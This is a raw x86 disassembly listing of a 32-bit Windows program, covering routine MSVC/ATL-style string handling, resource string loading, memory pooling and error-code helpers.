  405690:	and    DWORD PTR [ebp-0x4],0x0
  405694:	lea    ecx,[ebp-0x10]
  405697:	test   esi,0xffff0000
  40569d:	jne    0x4056aa
  40569f:	movzx  eax,si
  4056a2:	push   eax
  4056a3:	call   0x4057f6
  4056a8:	jmp    0x4056b0
  4056aa:	push   esi
  4056ab:	call   0x40326d
  4056b0:	mov    DWORD PTR [ebp-0x4],0x1
  4056b7:	mov    ecx,edi
  4056b9:	mov    esi,DWORD PTR [ebp-0x10]
  4056bc:	push   esi
  4056bd:	call   0x40331a
  4056c2:	test   eax,eax
  4056c4:	lea    ecx,[esi-0x10]
  4056c7:	setne  bl
  4056ca:	call   0x403776
  4056cf:	mov    al,bl
  4056d1:	call   0x407e9b
  4056d6:	ret    
  4056d7:	int3   
  4056d8:	int3   
  4056d9:	int3   
  4056da:	int3   
  4056db:	int3   
  4056dc:	mov    edi,edi
  4056de:	push   ebp
  4056df:	mov    ebp,esp
  4056e1:	push   ecx
  4056e2:	mov    eax,ds:0x409004
  4056e7:	xor    eax,ebp
  4056e9:	mov    DWORD PTR [ebp-0x4],eax
  4056ec:	mov    eax,DWORD PTR [ecx]
  4056ee:	push   esi
  4056ef:	push   edi
  4056f0:	mov    edi,DWORD PTR [eax-0x10]
  4056f3:	test   edi,edi
  4056f5:	je     0x40570a
  4056f7:	mov    eax,DWORD PTR [edi]
  4056f9:	mov    esi,DWORD PTR [eax+0x10]
  4056fc:	mov    ecx,esi
  4056fe:	call   DWORD PTR ds:0x40a20c
  405704:	mov    ecx,edi
  405706:	call   esi
  405708:	jmp    0x40570c
  40570a:	xor    eax,eax
  40570c:	test   eax,eax
  40570e:	jne    0x405727
  405710:	mov    eax,ds:0x4093c0
  405715:	mov    esi,DWORD PTR [eax+0x10]
  405718:	mov    ecx,esi
  40571a:	call   DWORD PTR ds:0x40a20c
  405720:	mov    ecx,0x4093c0
  405725:	call   esi
  405727:	mov    ecx,DWORD PTR [ebp-0x4]
  40572a:	pop    edi
  40572b:	xor    ecx,ebp
  40572d:	pop    esi
  40572e:	call   0x407750
  405733:	mov    esp,ebp
  405735:	pop    ebp
  405736:	ret    
  405737:	int3   
  405738:	int3   
  405739:	int3   
  40573a:	int3   
  40573b:	int3   
  40573c:	mov    edi,edi
  40573e:	push   ebp
  40573f:	mov    ebp,esp
  405741:	push   ecx
  405742:	and    DWORD PTR [ebp-0x4],0x0
  405746:	mov    edx,ecx
  405748:	push   ebx
  405749:	push   esi
  40574a:	push   edi
  40574b:	mov    edi,DWORD PTR [ebp+0xc]
  40574e:	test   edi,edi
  405750:	jns    0x405754
  405752:	xor    edi,edi
  405754:	mov    esi,DWORD PTR [ebp+0x10]
  405757:	test   esi,esi
  405759:	jns    0x40575d
  40575b:	xor    esi,esi
  40575d:	mov    eax,0x7fffffff
  405762:	sub    eax,edi
  405764:	cmp    eax,esi
  405766:	jl     0x4057b9
  405768:	mov    ebx,DWORD PTR [edx]
  40576a:	lea    eax,[edi+esi*1]
  40576d:	mov    ecx,DWORD PTR [ebx-0xc]
  405770:	cmp    eax,ecx
  405772:	jle    0x405778
  405774:	mov    esi,ecx
  405776:	sub    esi,edi
  405778:	cmp    edi,ecx
  40577a:	jle    0x40577e
  40577c:	xor    esi,esi
  40577e:	test   edi,edi
  405780:	jne    0x40579f
  405782:	cmp    esi,ecx
  405784:	jne    0x40579f
  405786:	lea    ecx,[ebx-0x10]
  405789:	call   0x405870
  40578e:	lea    ecx,[eax+0x10]
  405791:	mov    eax,DWORD PTR [ebp+0x8]
  405794:	mov    DWORD PTR [eax],ecx
  405796:	pop    edi
  405797:	pop    esi
  405798:	pop    ebx
  405799:	mov    esp,ebp
  40579b:	pop    ebp
  40579c:	ret    0xc
  40579f:	mov    ecx,edx
  4057a1:	call   0x4056dc
  4057a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4057a9:	push   eax
  4057aa:	push   esi
  4057ab:	lea    eax,[ebx+edi*2]
  4057ae:	push   eax
  4057af:	call   0x4059b1
  4057b4:	mov    eax,DWORD PTR [ebp+0x8]
  4057b7:	jmp    0x405796
  4057b9:	mov    ecx,0x80070057
  4057be:	call   0x403805
  4057c3:	int3   
  4057c4:	int3   
  4057c5:	int3   
  4057c6:	int3   
  4057c7:	int3   
  4057c8:	int3   
  4057c9:	mov    edi,edi
  4057cb:	push   ebp
  4057cc:	mov    ebp,esp
  4057ce:	push   ecx
  4057cf:	mov    eax,DWORD PTR [ebp+0x8]
  4057d2:	xor    dl,dl
  4057d4:	test   eax,eax
  4057d6:	je     0x4057ea
  4057d8:	test   eax,0xffff0000
  4057dd:	jne    0x4057ea
  4057df:	movzx  eax,ax
  4057e2:	push   eax
  4057e3:	call   0x4057f6
  4057e8:	mov    dl,0x1
  4057ea:	mov    al,dl
  4057ec:	pop    ecx
  4057ed:	pop    ebp
  4057ee:	ret    0x4
  4057f1:	int3   
  4057f2:	int3   
  4057f3:	int3   
  4057f4:	int3   
  4057f5:	int3   
  4057f6:	mov    edi,edi
  4057f8:	push   ebp
  4057f9:	mov    ebp,esp
  4057fb:	push   ecx
  4057fc:	push   ecx
  4057fd:	push   ebx
  4057fe:	push   esi
  4057ff:	push   edi
  405800:	push   0x0
  405802:	mov    DWORD PTR [ebp-0x4],ecx
  405805:	call   0x4072ce
  40580a:	xor    ebx,ebx
  40580c:	mov    esi,eax
  40580e:	inc    ebx
  40580f:	test   esi,esi
  405811:	je     0x40584c
  405813:	mov    edi,DWORD PTR [ebp+0x8]
  405816:	shr    edi,0x4
  405819:	push   0x0
  40581b:	lea    eax,[edi+0x1]
  40581e:	movzx  eax,ax
  405821:	push   eax
  405822:	push   0x6
  405824:	push   esi
  405825:	call   DWORD PTR ds:0x40a0a4
  40582b:	test   eax,eax
  40582d:	je     0x40583f
  40582f:	push   DWORD PTR [ebp+0x8]
  405832:	mov    edx,eax
  405834:	mov    ecx,esi
  405836:	call   0x405c6e
  40583b:	test   eax,eax
  40583d:	jne    0x40584e
  40583f:	push   ebx
  405840:	call   0x4072ce
  405845:	mov    esi,eax
  405847:	inc    ebx
  405848:	test   esi,esi
  40584a:	jne    0x405819
  40584c:	xor    esi,esi
  40584e:	test   esi,esi
  405850:	jne    0x405856
  405852:	xor    eax,eax
  405854:	jmp    0x405862
  405856:	push   DWORD PTR [ebp+0x8]
  405859:	mov    ecx,DWORD PTR [ebp-0x4]
  40585c:	push   esi
  40585d:	call   0x405909
  405862:	pop    edi
  405863:	pop    esi
  405864:	pop    ebx
  405865:	mov    esp,ebp
  405867:	pop    ebp
  405868:	ret    0x4
  40586b:	int3   
  40586c:	int3   
  40586d:	int3   
  40586e:	int3   
  40586f:	int3   
  405870:	mov    edi,edi
  405872:	push   ebp
  405873:	mov    ebp,esp
  405875:	push   ecx
  405876:	mov    eax,ds:0x409004
  40587b:	xor    eax,ebp
  40587d:	mov    DWORD PTR [ebp-0x4],eax
  405880:	push   ebx
  405881:	mov    ebx,ecx
  405883:	push   esi
  405884:	push   edi
  405885:	mov    edi,DWORD PTR [ebx]
  405887:	mov    eax,DWORD PTR [edi]
  405889:	mov    esi,DWORD PTR [eax+0x10]
  40588c:	mov    ecx,esi
  40588e:	call   DWORD PTR ds:0x40a20c
  405894:	mov    ecx,edi
  405896:	call   esi
  405898:	mov    edi,eax
  40589a:	lea    eax,[ebx+0xc]
  40589d:	cmp    DWORD PTR [eax],0x0
  4058a0:	jl     0x4058ad
  4058a2:	cmp    edi,DWORD PTR [ebx]
  4058a4:	jne    0x4058ad
  4058a6:	mov    esi,ebx
  4058a8:	lock inc DWORD PTR [eax]
  4058ab:	jmp    0x4058eb
  4058ad:	mov    eax,DWORD PTR [edi]
  4058af:	push   0x2
  4058b1:	push   DWORD PTR [ebx+0x4]
  4058b4:	mov    esi,DWORD PTR [eax]
  4058b6:	mov    ecx,esi
  4058b8:	call   DWORD PTR ds:0x40a20c
  4058be:	mov    ecx,edi
  4058c0:	call   esi
  4058c2:	mov    esi,eax
  4058c4:	test   esi,esi
  4058c6:	je     0x4058fe
  4058c8:	mov    eax,DWORD PTR [ebx+0x4]
  4058cb:	mov    DWORD PTR [esi+0x4],eax
  4058ce:	mov    eax,DWORD PTR [ebx+0x4]
  4058d1:	lea    ecx,[eax*2+0x2]
  4058d8:	push   ecx
  4058d9:	lea    eax,[ebx+0x10]
  4058dc:	push   eax
  4058dd:	push   ecx
  4058de:	lea    eax,[esi+0x10]
  4058e1:	push   eax
  4058e2:	call   DWORD PTR ds:0x40a180
  4058e8:	add    esp,0x10
  4058eb:	mov    ecx,DWORD PTR [ebp-0x4]
  4058ee:	mov    eax,esi
  4058f0:	pop    edi
  4058f1:	pop    esi
  4058f2:	xor    ecx,ebp
  4058f4:	pop    ebx
  4058f5:	call   0x407750
  4058fa:	mov    esp,ebp
  4058fc:	pop    ebp
  4058fd:	ret    
  4058fe:	call   0x403767
  405903:	int3   
  405904:	int3   
  405905:	int3   
  405906:	int3   
  405907:	int3   
  405908:	int3   
  405909:	mov    edi,edi
  40590b:	push   ebp
  40590c:	mov    ebp,esp
  40590e:	push   ecx
  40590f:	push   ecx
  405910:	push   ebx
  405911:	xor    eax,eax
  405913:	mov    ebx,ecx
  405915:	push   esi
  405916:	push   eax
  405917:	mov    DWORD PTR [ebp-0x4],eax
  40591a:	mov    eax,DWORD PTR [ebp+0xc]
  40591d:	shr    eax,0x4
  405920:	inc    eax
  405921:	movzx  eax,ax
  405924:	push   eax
  405925:	push   0x6
  405927:	push   DWORD PTR [ebp+0x8]
  40592a:	call   DWORD PTR ds:0x40a0a4
  405930:	test   eax,eax
  405932:	je     0x4059a2
  405934:	push   DWORD PTR [ebp+0xc]
  405937:	mov    ecx,DWORD PTR [ebp+0x8]
  40593a:	mov    edx,eax
  40593c:	call   0x405c6e
  405941:	mov    esi,eax
  405943:	test   esi,esi
  405945:	je     0x4059a2
  405947:	push   edi
  405948:	movzx  edi,WORD PTR [esi]
  40594b:	mov    ecx,ebx
  40594d:	push   edi
  40594e:	call   0x4033fb
  405953:	mov    DWORD PTR [ebp-0x8],eax
  405956:	movzx  eax,WORD PTR [esi]
  405959:	add    esi,0x2
  40595c:	cmp    eax,0xffffffff
  40595f:	jne    0x405979
  405961:	mov    ecx,esi
  405963:	lea    edx,[ecx+0x2]
  405966:	mov    ax,WORD PTR [ecx]
  405969:	add    ecx,0x2
  40596c:	cmp    ax,WORD PTR [ebp-0x4]
  405970:	jne    0x405966
  405972:	sub    ecx,edx
  405974:	sar    ecx,1
  405976:	lea    eax,[ecx+0x1]
  405979:	add    eax,eax
  40597b:	push   eax
  40597c:	push   esi
  40597d:	lea    eax,[edi+edi*1]
  405980:	push   eax
  405981:	push   DWORD PTR [ebp-0x8]
  405984:	call   DWORD PTR ds:0x40a180
  40598a:	add    esp,0x10
  40598d:	mov    ecx,eax
  40598f:	call   0x405c36
  405994:	push   edi
  405995:	mov    ecx,ebx
  405997:	call   0x4034da
  40599c:	xor    eax,eax
  40599e:	inc    eax
  40599f:	pop    edi
  4059a0:	jmp    0x4059a4
  4059a2:	xor    eax,eax
  4059a4:	pop    esi
  4059a5:	pop    ebx
  4059a6:	mov    esp,ebp
  4059a8:	pop    ebp
  4059a9:	ret    0x8
  4059ac:	int3   
  4059ad:	int3   
  4059ae:	int3   
  4059af:	int3   
  4059b0:	int3   
  4059b1:	mov    edi,edi
  4059b3:	push   ebp
  4059b4:	mov    ebp,esp
  4059b6:	push   ecx
  4059b7:	mov    eax,ds:0x409004
  4059bc:	xor    eax,ebp
  4059be:	mov    DWORD PTR [ebp-0x4],eax
  4059c1:	mov    eax,DWORD PTR [ebp+0x10]
  4059c4:	push   ebx
  4059c5:	mov    ebx,ecx
  4059c7:	push   edi
  4059c8:	test   eax,eax
  4059ca:	je     0x405a2e
  4059cc:	cmp    DWORD PTR [ebp+0x8],0x0
  4059d0:	mov    edi,DWORD PTR [ebp+0xc]
  4059d3:	jne    0x4059e0
  4059d5:	test   edi,edi
  4059d7:	je     0x4059e0
  4059d9:	mov    ecx,0x80070057
  4059de:	jmp    0x405a33
  4059e0:	mov    eax,DWORD PTR [eax]
  4059e2:	push   esi
  4059e3:	push   0x2
  4059e5:	push   edi
  4059e6:	mov    esi,DWORD PTR [eax]
  4059e8:	mov    ecx,esi
  4059ea:	call   DWORD PTR ds:0x40a20c
  4059f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4059f3:	call   esi
  4059f5:	pop    esi
  4059f6:	test   eax,eax
  4059f8:	je     0x405a38
  4059fa:	add    eax,0x10
  4059fd:	mov    ecx,ebx
  4059ff:	push   edi
  405a00:	mov    DWORD PTR [ebx],eax
  405a02:	call   0x4034da
  405a07:	lea    eax,[edi+edi*1]
  405a0a:	push   eax
  405a0b:	push   DWORD PTR [ebp+0x8]
  405a0e:	push   eax
  405a0f:	push   DWORD PTR [ebx]
  405a11:	call   DWORD PTR ds:0x40a180
  405a17:	mov    ecx,DWORD PTR [ebp-0x4]
  405a1a:	add    esp,0x10
  405a1d:	mov    eax,ebx
  405a1f:	xor    ecx,ebp
  405a21:	pop    edi
  405a22:	pop    ebx
  405a23:	call   0x407750
  405a28:	mov    esp,ebp
  405a2a:	pop    ebp
  405a2b:	ret    0xc
  405a2e:	mov    ecx,0x80004005
  405a33:	call   0x403805
  405a38:	call   0x403767
  405a3d:	int3   
  405a3e:	int3   
  405a3f:	int3   
  405a40:	int3   
  405a41:	int3   
  405a42:	int3   
  405a43:	mov    edi,edi
  405a45:	push   ebp
  405a46:	mov    ebp,esp
  405a48:	push   esi
  405a49:	mov    esi,ecx
  405a4b:	push   ecx
  405a4c:	push   DWORD PTR [esi+0x4]
  405a4f:	push   DWORD PTR [ebp+0x8]
  405a52:	call   0x405b21
  405a57:	mov    ecx,DWORD PTR [esi+0x4]
  405a5a:	test   ecx,ecx
  405a5c:	je     0x405a62
  405a5e:	mov    DWORD PTR [ecx],eax
  405a60:	jmp    0x405a64
  405a62:	mov    DWORD PTR [esi],eax
  405a64:	mov    DWORD PTR [esi+0x4],eax
  405a67:	pop    esi
  405a68:	pop    ebp
  405a69:	ret    0x4
  405a6c:	int3   
  405a6d:	int3   
  405a6e:	int3   
  405a6f:	int3   
  405a70:	int3   
  405a71:	mov    edi,edi
  405a73:	push   ebx
  405a74:	push   edi
  405a75:	mov    edi,ecx
  405a77:	xor    ebx,ebx
  405a79:	jmp    0x405a8d
  405a7b:	mov    ecx,DWORD PTR [edi]
  405a7d:	test   ecx,ecx
  405a7f:	je     0x405ab9
  405a81:	mov    eax,DWORD PTR [ecx]
  405a83:	push   ecx
  405a84:	mov    ecx,edi
  405a86:	mov    DWORD PTR [edi],eax
  405a88:	call   0x405ba7
  405a8d:	cmp    DWORD PTR [edi+0x8],ebx
  405a90:	ja     0x405a7b
  405a92:	mov    eax,DWORD PTR [edi+0xc]
  405a95:	mov    DWORD PTR [edi],ebx
  405a97:	mov    DWORD PTR [edi+0x4],ebx
  405a9a:	mov    DWORD PTR [edi+0x10],ebx
  405a9d:	test   eax,eax
  405a9f:	je     0x405ab6
  405aa1:	push   esi
  405aa2:	mov    esi,DWORD PTR [eax]
  405aa4:	push   eax
  405aa5:	call   DWORD PTR ds:0x40a1e8
  405aab:	mov    eax,esi
  405aad:	pop    ecx
  405aae:	test   esi,esi
  405ab0:	jne    0x405aa2
  405ab2:	mov    DWORD PTR [edi+0xc],ebx
  405ab5:	pop    esi
  405ab6:	pop    edi
  405ab7:	pop    ebx
  405ab8:	ret    
  405ab9:	mov    ecx,0x80004005
  405abe:	call   0x403805
  405ac3:	int3   
  405ac4:	int3   
  405ac5:	int3   
  405ac6:	int3   
  405ac7:	int3   
  405ac8:	int3   
  405ac9:	mov    edi,edi
  405acb:	push   ebp
  405acc:	mov    ebp,esp
  405ace:	mov    edx,DWORD PTR [ebp+0x8]
  405ad1:	mov    ecx,DWORD PTR [edx]
  405ad3:	test   ecx,ecx
  405ad5:	je     0x405ae2
  405ad7:	mov    eax,DWORD PTR [ecx]
  405ad9:	mov    DWORD PTR [edx],eax
  405adb:	lea    eax,[ecx+0x8]
  405ade:	pop    ebp
  405adf:	ret    0x4
  405ae2:	mov    ecx,0x80004005
  405ae7:	call   0x403805
  405aec:	int3   
  405aed:	int3   
  405aee:	int3   
  405aef:	int3   
  405af0:	int3   
  405af1:	int3   
  405af2:	mov    edi,edi
  405af4:	push   ebp
  405af5:	mov    ebp,esp
  405af7:	push   esi
  405af8:	mov    esi,DWORD PTR [ecx]
  405afa:	jmp    0x405b0d
  405afc:	mov    edx,DWORD PTR [ebp+0x8]
  405aff:	mov    ecx,DWORD PTR [esi+0x8]
  405b02:	call   0x4037be
  405b07:	test   eax,eax
  405b09:	je     0x405b18
  405b0b:	mov    esi,DWORD PTR [esi]
  405b0d:	test   esi,esi
  405b0f:	jne    0x405afc
  405b11:	xor    eax,eax
  405b13:	pop    esi
  405b14:	pop    ebp
  405b15:	ret    0x8
  405b18:	mov    eax,esi
  405b1a:	jmp    0x405b13
  405b1c:	int3   
  405b1d:	int3   
  405b1e:	int3   
  405b1f:	int3   
  405b20:	int3   
  405b21:	push   0x4
  405b23:	mov    eax,0x4084c7
  405b28:	call   0x407edc
  405b2d:	mov    esi,ecx
  405b2f:	cmp    DWORD PTR [esi+0x10],0x0
  405b33:	jne    0x405b6e
  405b35:	mov    edx,DWORD PTR [esi+0x14]
  405b38:	push   ecx
  405b39:	lea    ecx,[esi+0xc]
  405b3c:	call   0x405bde
  405b41:	mov    edx,eax
  405b43:	test   edx,edx
  405b45:	jne    0x405b51
  405b47:	mov    ecx,0x8007000e
  405b4c:	call   0x403805
  405b51:	mov    ecx,DWORD PTR [esi+0x14]
  405b54:	imul   eax,ecx,0xc
  405b57:	add    eax,0xfffffff8
  405b5a:	add    edx,eax
  405b5c:	jmp    0x405b69
  405b5e:	mov    eax,DWORD PTR [esi+0x10]
  405b61:	mov    DWORD PTR [edx],eax
  405b63:	mov    DWORD PTR [esi+0x10],edx
  405b66:	sub    edx,0xc
  405b69:	sub    ecx,0x1
  405b6c:	jns    0x405b5e
  405b6e:	mov    edi,DWORD PTR [esi+0x10]
  405b71:	mov    DWORD PTR [ebp-0x10],edi
  405b74:	mov    ebx,DWORD PTR [edi]
  405b76:	and    DWORD PTR [ebp-0x4],0x0
  405b7a:	test   edi,edi
  405b7c:	je     0x405b89
  405b7e:	push   DWORD PTR [ebp+0x8]
  405b81:	lea    ecx,[edi+0x8]
  405b84:	call   0x4054f4
  405b89:	mov    ecx,DWORD PTR [ebp+0xc]
  405b8c:	mov    eax,edi
  405b8e:	mov    DWORD PTR [esi+0x10],ebx
  405b91:	and    DWORD PTR [edi],0x0
  405b94:	mov    DWORD PTR [edi+0x4],ecx
  405b97:	inc    DWORD PTR [esi+0x8]
  405b9a:	call   0x407e9b
  405b9f:	ret    0xc
  405ba2:	int3   
  405ba3:	int3   
  405ba4:	int3   
  405ba5:	int3   
  405ba6:	int3   
  405ba7:	mov    edi,edi
  405ba9:	push   ebp
  405baa:	mov    ebp,esp
  405bac:	push   esi
  405bad:	mov    esi,DWORD PTR [ebp+0x8]
  405bb0:	push   edi
  405bb1:	mov    edi,ecx
  405bb3:	mov    ecx,DWORD PTR [esi+0x8]
  405bb6:	sub    ecx,0x10
  405bb9:	call   0x403776
  405bbe:	mov    eax,DWORD PTR [edi+0x10]
  405bc1:	mov    DWORD PTR [esi],eax
  405bc3:	sub    DWORD PTR [edi+0x8],0x1
  405bc7:	mov    DWORD PTR [edi+0x10],esi
  405bca:	jne    0x405bd3
  405bcc:	mov    ecx,edi
  405bce:	call   0x405a71
  405bd3:	pop    edi
  405bd4:	pop    esi
  405bd5:	pop    ebp
  405bd6:	ret    0x4
  405bd9:	int3   
  405bda:	int3   
  405bdb:	int3   
  405bdc:	int3   
  405bdd:	int3   
  405bde:	mov    edi,edi
  405be0:	push   esi
  405be1:	push   0xc
  405be3:	mov    esi,ecx
  405be5:	mov    eax,edx
  405be7:	pop    ecx
  405be8:	mul    ecx
  405bea:	test   edx,edx
  405bec:	ja     0x405c19
  405bee:	push   0xffffffff
  405bf0:	pop    ecx
  405bf1:	jb     0x405bf7
  405bf3:	cmp    eax,ecx
  405bf5:	ja     0x405c19
  405bf7:	sub    ecx,eax
  405bf9:	cmp    ecx,0x4
  405bfc:	jb     0x405c19
  405bfe:	add    eax,0x4
  405c01:	push   eax
  405c02:	call   DWORD PTR ds:0x40a1e4
  405c08:	pop    ecx
  405c09:	mov    ecx,eax
  405c0b:	test   ecx,ecx
  405c0d:	je     0x405c19
  405c0f:	mov    eax,DWORD PTR [esi]
  405c11:	mov    DWORD PTR [ecx],eax
  405c13:	mov    eax,ecx
  405c15:	mov    DWORD PTR [esi],ecx
  405c17:	jmp    0x405c1b
  405c19:	xor    eax,eax
  405c1b:	pop    esi
  405c1c:	ret    0x4
  405c1f:	int3   
  405c20:	int3   
  405c21:	int3   
  405c22:	int3   
  405c23:	int3   
  405c24:	int3   
  405c25:	int3   
  405c26:	int3   
  405c27:	int3   
  405c28:	int3   
  405c29:	int3   
  405c2a:	int3   
  405c2b:	int3   
  405c2c:	int3   
  405c2d:	int3   
  405c2e:	int3   
  405c2f:	int3   
  405c30:	ret    
  405c31:	int3   
  405c32:	int3   
  405c33:	int3   
  405c34:	int3   
  405c35:	int3   
  405c36:	test   ecx,ecx
  405c38:	je     0x405c66
  405c3a:	cmp    ecx,0xc
  405c3d:	je     0x405c5f
  405c3f:	cmp    ecx,0x16
  405c42:	je     0x405c58
  405c44:	cmp    ecx,0x22
  405c47:	je     0x405c58
  405c49:	cmp    ecx,0x50
  405c4c:	je     0x405c66
  405c4e:	mov    ecx,0x80004005
  405c53:	jmp    0x403805
  405c58:	mov    ecx,0x80070057
  405c5d:	jmp    0x405c53
  405c5f:	mov    ecx,0x8007000e
  405c64:	jmp    0x405c53
  405c66:	mov    eax,ecx
  405c68:	ret    
  405c69:	int3   
  405c6a:	int3   
  405c6b:	int3   
  405c6c:	int3   
  405c6d:	int3   
  405c6e:	mov    edi,edi
  405c70:	push   ebp
  405c71:	mov    ebp,esp
  405c73:	push   ebx
  405c74:	push   edi
  405c75:	mov    edi,edx
  405c77:	mov    ebx,ecx
  405c79:	push   edi
  405c7a:	push   ebx
  405c7b:	call   DWORD PTR ds:0x40a0a8
  405c81:	test   eax,eax
  405c83:	je     0x405cca
  405c85:	push   esi
  405c86:	push   eax
  405c87:	call   DWORD PTR ds:0x40a0ac
  405c8d:	mov    esi,eax
  405c8f:	test   esi,esi
  405c91:	je     0x405cbc
  405c93:	push   edi
  405c94:	push   ebx
  405c95:	call   DWORD PTR ds:0x40a0b0
  405c9b:	mov    edx,DWORD PTR [ebp+0x8]
  405c9e:	lea    ecx,[esi+eax*1]
  405ca1:	and    edx,0xf
  405ca4:	jbe    0x405cb8
  405ca6:	cmp    esi,ecx
  405ca8:	jae    0x405cbc
  405caa:	movzx  eax,WORD PTR [esi]
  405cad:	lea    esi,[esi+eax*2]
  405cb0:	add    esi,0x2
  405cb3:	sub    edx,0x1
  405cb6:	jne    0x405ca6
  405cb8:	cmp    esi,ecx
  405cba:	jb     0x405cc0
  405cbc:	xor    eax,eax
  405cbe:	jmp    0x405cc9
  405cc0:	movzx  eax,WORD PTR [esi]
  405cc3:	neg    eax
  405cc5:	sbb    eax,eax
  405cc7:	and    eax,esi
  405cc9:	pop    esi
  405cca:	pop    edi
  405ccb:	pop    ebx
  405ccc:	pop    ebp
  405ccd:	ret    0x4
  405cd0:	int3   
  405cd1:	int3   
  405cd2:	int3   
  405cd3:	int3   
  405cd4:	int3   
  405cd5:	mov    edi,edi
  405cd7:	push   ebp
  405cd8:	mov    ebp,esp
  405cda:	push   ecx
  405cdb:	push   esi
  405cdc:	push   edi
  405cdd:	lea    eax,[ebp-0x4]
  405ce0:	mov    esi,0x200
  405ce5:	push   eax
  405ce6:	mov    edx,esi
  405ce8:	mov    edi,ecx
  405cea:	call   0x405d80
  405cef:	test   eax,eax
  405cf1:	js     0x405d07
  405cf3:	mov    eax,DWORD PTR [ebp-0x4]
  405cf6:	sub    esi,eax
  405cf8:	push   ecx
  405cf9:	push   DWORD PTR [ebp+0x8]
  405cfc:	mov    edx,esi
  405cfe:	push   ecx
  405cff:	lea    ecx,[edi+eax*2]
  405d02:	call   0x405eb5
  405d07:	pop    edi
  405d08:	pop    esi
  405d09:	mov    esp,ebp
  405d0b:	pop    ebp
  405d0c:	ret    0x4
  405d0f:	int3   
  405d10:	int3   
  405d11:	int3   
  405d12:	int3   
  405d13:	int3   
  405d14:	mov    edi,edi
  405d16:	push   ebp
  405d17:	mov    ebp,esp
  405d19:	mov    eax,DWORD PTR [ebp+0xc]
  405d1c:	push   esi
  405d1d:	xor    esi,esi
  405d1f:	test   eax,eax
  405d21:	je     0x405d2a
  405d23:	cmp    eax,0x7fffffff
  405d28:	jbe    0x405d2f
  405d2a:	mov    esi,0x80070057
  405d2f:	test   esi,esi
  405d31:	js     0x405d6a
  405d33:	push   ebx
  405d34:	mov    ebx,DWORD PTR [ebp+0x8]
  405d37:	xor    esi,esi
  405d39:	push   edi
  405d3a:	lea    edi,[eax-0x1]
  405d3d:	lea    eax,[ebp+0x14]
  405d40:	push   eax
  405d41:	push   DWORD PTR [ebp+0x10]
  405d44:	push   edi
  405d45:	push   ebx
  405d46:	call   DWORD PTR ds:0x40a18c
  405d4c:	add    esp,0x10
  405d4f:	test   eax,eax
  405d51:	js     0x405d5b
  405d53:	cmp    eax,edi
  405d55:	ja     0x405d5b
  405d57:	jne    0x405d66
  405d59:	jmp    0x405d60
  405d5b:	mov    esi,0x8007007a
  405d60:	xor    eax,eax
  405d62:	mov    WORD PTR [ebx+edi*2],ax
  405d66:	pop    edi
  405d67:	pop    ebx
  405d68:	jmp    0x405d76
  405d6a:	test   eax,eax
  405d6c:	je     0x405d76
  405d6e:	mov    ecx,DWORD PTR [ebp+0x8]
  405d71:	xor    eax,eax
  405d73:	mov    WORD PTR [ecx],ax
  405d76:	mov    eax,esi
  405d78:	pop    esi
  405d79:	pop    ebp
  405d7a:	ret    
  405d7b:	int3   
  405d7c:	int3   
  405d7d:	int3   
  405d7e:	int3   
  405d7f:	int3   
  405d80:	mov    edi,edi
  405d82:	push   ebp
  405d83:	mov    ebp,esp
  405d85:	push   ebx
  405d86:	push   esi
  405d87:	xor    ebx,ebx
  405d89:	push   edi
  405d8a:	mov    esi,ebx
  405d8c:	mov    edi,edx
  405d8e:	cmp    WORD PTR [ecx],bx
  405d91:	je     0x405d9b
  405d93:	add    ecx,0x2
  405d96:	sub    edx,0x1
  405d99:	jne    0x405d8e
  405d9b:	test   edx,edx
  405d9d:	jne    0x405da4
  405d9f:	mov    esi,0x80070057
  405da4:	mov    eax,DWORD PTR [ebp+0x8]
  405da7:	test   eax,eax
  405da9:	je     0x405db7
  405dab:	test   esi,esi
  405dad:	js     0x405db5
  405daf:	sub    edi,edx
  405db1:	mov    DWORD PTR [eax],edi
  405db3:	jmp    0x405db7
  405db5:	mov    DWORD PTR [eax],ebx
  405db7:	pop    edi
  405db8:	mov    eax,esi
  405dba:	pop    esi
  405dbb:	pop    ebx
  405dbc:	pop    ebp
  405dbd:	ret    0x4
  405dc0:	int3   
  405dc1:	int3   
  405dc2:	int3   
  405dc3:	int3   
  405dc4:	int3   
  405dc5:	mov    edi,edi
  405dc7:	push   ebp
  405dc8:	mov    ebp,esp
  405dca:	push   esi
  405dcb:	mov    esi,DWORD PTR [ebp+0x8]
  405dce:	test   ecx,ecx
  405dd0:	je     0x405ddf
  405dd2:	push   esi
  405dd3:	mov    edx,0x7fffffff
  405dd8:	call   0x405d80
  405ddd:	jmp    0x405de4
  405ddf:	mov    eax,0x80070057
  405de4:	test   eax,eax
  405de6:	jns    0x405def
  405de8:	test   esi,esi
  405dea:	je     0x405def
  405dec:	and    DWORD PTR [esi],0x0
  405def:	pop    esi
  405df0:	pop    ebp
  405df1:	ret    0x4
  405df4:	int3   
  405df5:	int3   
  405df6:	int3   
  405df7:	int3   
  405df8:	int3   
  405df9:	mov    edi,edi
  405dfb:	push   ebp
  405dfc:	mov    ebp,esp
  405dfe:	push   ecx
  405dff:	push   ecx
  405e00:	push   esi
  405e01:	push   edi
  405e02:	lea    eax,[ebp-0x8]
  405e05:	xor    edi,edi
  405e07:	push   eax
  405e08:	lea    eax,[ebp-0x4]
  405e0b:	mov    DWORD PTR [ebp-0x4],edi
  405e0e:	push   eax
  405e0f:	push   edi
  405e10:	push   DWORD PTR [ebp+0x18]
  405e13:	mov    esi,ecx
  405e15:	push   DWORD PTR [ebp+0x14]
  405e18:	push   edi
  405e19:	push   edi
  405e1a:	push   DWORD PTR [ebp+0xc]
  405e1d:	push   DWORD PTR [ebp+0x8]
  405e20:	call   DWORD PTR ds:0x40a110
  405e26:	mov    edx,eax
  405e28:	mov    eax,DWORD PTR [ebp+0x20]
  405e2b:	test   eax,eax
  405e2d:	je     0x405e34
  405e2f:	mov    ecx,DWORD PTR [ebp-0x8]
  405e32:	mov    DWORD PTR [eax],ecx
  405e34:	test   edx,edx
  405e36:	jne    0x405e4f
  405e38:	mov    edx,edi
  405e3a:	cmp    DWORD PTR [esi],edx
  405e3c:	je     0x405e4a
  405e3e:	push   DWORD PTR [esi]
  405e40:	call   DWORD PTR ds:0x40a034
  405e46:	mov    edx,eax
  405e48:	mov    DWORD PTR [esi],edi
  405e4a:	mov    eax,DWORD PTR [ebp-0x4]
  405e4d:	mov    DWORD PTR [esi],eax
  405e4f:	pop    edi
  405e50:	mov    eax,edx
  405e52:	pop    esi
  405e53:	mov    esp,ebp
  405e55:	pop    ebp
  405e56:	ret    0x1c
  405e59:	int3   
  405e5a:	int3   
  405e5b:	int3   
